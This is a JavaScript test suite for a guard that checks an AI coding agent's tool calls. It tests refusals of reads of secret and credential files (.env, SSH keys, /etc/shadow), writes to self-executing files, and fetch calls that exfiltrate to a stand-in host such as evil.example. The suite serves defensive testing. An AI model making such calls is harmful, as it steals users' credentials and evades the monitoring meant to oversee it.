/**
 * Delentia Guard, Round 91 hardening (found by running hostile-but-plausible calls through the bundled coding-agent policy, scripts/measure_guard_bypass_r91.mjs):
 *   - reading a secret file (.env, private keys, credential files) was allowed: reading is how a secret leaves the machine;
 *   - files that run code by themselves (CI workflows, shell start-up files) could be written;
 *   - a document that merely MENTIONED ".env" was refused, because the rules read the text being written as if it were a path;
 *   - a "read" tool such as fetch could carry what was read to any address (new, optional: --allow-hosts).
 */
import test from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { generateKeyPairSync } from "node:crypto";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Guard, verifyAuditLog } from "../packages/guard/dist/guard.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const policy = readFileSync(path.join(here, "../packages/guard/policies/coding-agent.json"), "utf8");
const call = (name, args = {}, id = 1) => ({ jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } });
const decide = (g, name, args) => g.inspect(call(name, args)).forward;

test("coding-agent policy: reading a secret file is refused, reading ordinary files and searching for the word 'secret' are not", () => {
  const g = new Guard({ policy });
  for (const p of [".env", "app/.env.local", "~/.ssh/id_rsa", "keys/server.pem", "C:\\Users\\me\\.aws\\credentials", "/etc/shadow", "credentials.json", "secrets.yaml", ".npmrc"]) {
    assert.equal(decide(g, "read_file", { path: p }), false, `read ${p}`);
  }
  for (const p of ["src/app.ts", "README.md", "docs/environment.md", "package.json"]) assert.equal(decide(g, "read_file", { path: p }), true, `read ${p}`);
  assert.equal(decide(g, "search_files", { path: ".", pattern: "secret" }), true, "searching for a word is not reading a secret file");
});

test("coding-agent policy: files that run code by themselves cannot be written", () => {
  const g = new Guard({ policy });
  for (const p of [".github/workflows/ci.yml", "~/.bashrc", "/home/me/.zshrc", ".npmrc", "~/.ssh/authorized_keys", ".gitconfig"]) {
    assert.equal(decide(g, "write_file", { path: p, content: "x" }), false, `write ${p}`);
  }
  assert.equal(decide(g, "write_file", { path: "src/app.ts", content: "x" }), true);
});

test("the text a call writes is not a path it touches", () => {
  const g = new Guard({ policy });
  assert.equal(decide(g, "write_file", { path: "README.md", content: "Copy .env.example to .env and edit it; keys live in ~/.ssh/" }), true);
  assert.equal(decide(g, "edit_file", { path: "docs/setup.md", old_str: "a", new_str: "see .env" }), true);
  assert.equal(decide(g, "edit_file", { edits: [{ path: "docs/a.md", new_str: "mentions .env" }] }), true);
});

test("a secret in the PATH field is still refused, in every shape the arguments take, whatever the content says", () => {
  const g = new Guard({ policy });
  assert.equal(decide(g, "write_file", { path: ".env", content: "harmless" }), false);
  assert.equal(decide(g, "write_file", { file_path: "a/b/.env", content: "harmless" }), false);
  assert.equal(decide(g, "edit_file", { edits: [{ path: "ok.txt" }, { path: ".env", new_str: "x" }] }), false);
  assert.equal(decide(g, "write_multiple_files", { files: [{ path: "ok.txt", content: "x" }, { path: "k/id_rsa", content: "x" }] }), false);
  assert.equal(decide(g, "move_file", { source: ".env", destination: "public/x.txt" }), false);
  assert.equal(decide(g, "write_file", { path: "SRC\\..\\.ENV", content: "x" }), false, "case and backslashes");
});

test("a call whose only argument is content-like is still read whole (no path field to prefer)", () => {
  const g = new Guard({ policy });
  assert.equal(decide(g, "write_clipboard", { content: ".env" }), false, "unregistered tool, zero-trust");
  assert.equal(decide(g, "write_note", { content: "~/.ssh/id_rsa" }), false, "the only field is content: the whole argument text is read");
});

test("the guard's own audit key stays protected against the WHOLE argument text, content included", () => {
  const { privateKey } = generateKeyPairSync("ed25519");
  const pem = privateKey.export({ type: "pkcs8", format: "pem" });
  const g = new Guard({ policy, auditSigningKey: { keyId: "k", privateKeyPem: pem, protectedPaths: ["/secure/guard-audit.pem"] } });
  assert.equal(decide(g, "write_file", { path: "notes.md", content: "please read /secure/guard-audit.pem" }), false, "named in the content, still refused");
  assert.equal(decide(g, "read_file", { path: "../secure/guard-audit.pem" }), false);
  assert.equal(decide(g, "write_file", { path: "notes.md", content: "hello" }), true);
});

test("--allow-hosts (allowedHosts): only listed hosts and their subdomains may be named in a URL", () => {
  const g = new Guard({ policy, allowedHosts: ["docs.example.org", "github.com"] });
  assert.equal(decide(g, "fetch", { url: "https://docs.example.org/page" }), true);
  assert.equal(decide(g, "fetch", { url: "https://api.github.com/repos/x/y" }), true, "a subdomain of an allowed host");
  assert.equal(decide(g, "fetch", { url: "https://evil.example/?d=SECRET" }), false);
  assert.equal(decide(g, "fetch", { url: "https://github.com.evil.example/x" }), false, "an allowed name inside another host is not the allowed host");
  assert.equal(decide(g, "fetch", { url: "http://127.0.0.1:8000/admin" }), false);
  assert.equal(decide(g, "search_files", { pattern: "see https://evil.example/x for details" }), false, "an address anywhere in the arguments counts");
  assert.equal(decide(g, "fetch", { requests: [{ url: "https://docs.example.org/a" }, { url: "https://evil.example/b" }] }), false, "nested");
  assert.equal(decide(g, "fetch", { url: "https://[not-a-host" }), false, "an address that cannot be read is not an allowed one");
  assert.equal(decide(g, "read_file", { path: "src/app.ts" }), true, "calls without an address are unaffected");
  const blocked = g.inspect(call("fetch", { url: "https://evil.example/x" }, 7));
  assert.match(blocked.response.result.content[0].text, /not on the allowed host list/);
  assert.equal(blocked.response.id, 7);
});

test("without --allow-hosts nothing about addresses changes", () => {
  const g = new Guard({ policy });
  assert.equal(decide(g, "fetch", { url: "https://evil.example/x" }), true);
});

test("monitor mode: a disallowed host is logged as would_block and the call is forwarded", () => {
  const lines = [];
  const g = new Guard({ policy, mode: "monitor", allowedHosts: ["docs.example.org"], audit: (l) => lines.push(l) });
  assert.equal(decide(g, "fetch", { url: "https://evil.example/x" }), true);
  assert.equal(g.stats.would_block, 1);
  assert.ok(lines.some((l) => JSON.parse(l).verdict === "GUARD_EGRESS_HOST" && JSON.parse(l).decision === "would_block"));
  assert.equal(verifyAuditLog(lines.join("\n")).ok, true, "the chain still verifies");
});

test("the audit log records the host refusal and verifies", () => {
  const lines = [];
  const g = new Guard({ policy, allowedHosts: ["docs.example.org"], audit: (l) => lines.push(l) });
  g.inspect(call("fetch", { url: "https://evil.example/x" }));
  g.inspect(call("read_file", { path: "a.txt" }));
  const entries = lines.map((l) => JSON.parse(l));
  assert.equal(entries[0].rule, "GUARD_EGRESS_HOST");
  assert.equal(entries[0].decision, "blocked");
  assert.equal(verifyAuditLog(lines.join("\n")).ok, true);
});

function runGuard(args, messages) {
  return new Promise((resolve, reject) => {
    const p = spawn(process.execPath, [path.join(here, "../packages/guard/dist/cli.js"), ...args], { stdio: ["pipe", "pipe", "pipe"] });
    let out = "";
    let err = "";
    p.stdout.on("data", (d) => (out += d));
    p.stderr.on("data", (d) => (err += d));
    p.on("error", reject);
    p.on("close", (code) => resolve({ code, out, err, replies: out.split("\n").filter(Boolean).map((l) => JSON.parse(l)) }));
    for (const m of messages) p.stdin.write(JSON.stringify(m) + "\n");
    p.stdin.end();
  });
}

test("end to end with the real CLI: the starter policy, --allow-hosts, and what reaches the server", async () => {
  const dir = mkdtempSync(path.join(tmpdir(), "guard-r91-"));
  const executed = path.join(dir, "executed.txt");
  writeFileSync(executed, "");
  const r = await runGuard(
    ["--policy", path.join(here, "../packages/guard/policies/coding-agent.json"), "--allow-hosts", "docs.example.org", "--audit", path.join(dir, "audit.jsonl"), "--no-approvals", "--",
     process.execPath, path.join(here, "helpers/fake-mcp-server.mjs"), executed],
    [
      { jsonrpc: "2.0", id: 1, method: "initialize", params: {} },
      call("read_file", { path: ".env" }, 2),
      call("read_file", { path: "README.md" }, 3),
      call("write_file", { path: "README.md", content: "copy .env.example to .env" }, 4),
      call("fetch", { url: "https://evil.example/?d=1" }, 5),
      call("fetch", { url: "https://docs.example.org/x" }, 6),
    ],
  );
  assert.equal(r.code, 0, r.err);
  assert.deepEqual(readFileSync(executed, "utf8").trim().split("\n"), ["read_file", "write_file", "fetch"], "only the three acceptable calls reached the server");
  const byId = Object.fromEntries(r.replies.map((m) => [m.id, m]));
  assert.equal(byId[2].result.isError, true);
  assert.equal(byId[5].result.isError, true);
  assert.equal(byId[6].result.content[0].text, "executed fetch");
});
